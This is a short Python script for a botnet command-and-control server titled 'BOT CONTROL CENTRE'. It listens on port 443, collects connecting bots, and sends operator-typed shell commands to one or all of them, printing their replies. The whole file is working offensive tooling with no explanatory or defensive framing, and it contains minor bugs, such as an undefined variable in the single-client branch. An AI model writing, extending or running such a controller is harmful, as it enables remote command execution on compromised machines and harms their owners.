import socket
import threading
import sys
ip = input("Enter an ip to lsiten on: ").strip()
listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((ip,443))
listener.listen(50)
clients = []
def get_output(client):
    while 1:
        try:
            resp = str(client.recv(1024).decode()).strip()
            if len(resp):
                print(resp)
        except:
            return
def get_menu():
    global clients
    while 1:
        print("BOT CONTROL CENTRE")
        print("0) Quit")
        print("1) List clients")
        print("2) Execute command on all clients")
        print("3) Execute command on single client")
        choice = int(input())
        bad_clients = []
        if choice == 1:
            index = 0
            for c in clients:
                print(str(index)+") "+str(c[1]))
                index += 1
        elif choice == 2:
            command = input("Enter command:\n")
            ind = 0
            for c in clients:
                try:
                    c[0].send(command.encode())
                except:
                    bad_clients.append(ind)
                ind += 1
        elif choice == 3:
            c_index = int(input("Enter client index:\n"))
            try:
                clients[c_index][0].send(input("Enter command:\n").encode())
            except:
                clients.pop(cl)
        elif choice == 0:
            sys.exit(0)
        for ind in bad_clients:
            clients.pop(ind)
        print()
            
threading.Thread(target=get_menu).start()
while 1:
    client,addr = listener.accept()
    clients.append([client,addr])
    threading.Thread(target=get_output,args=(client,)).start()
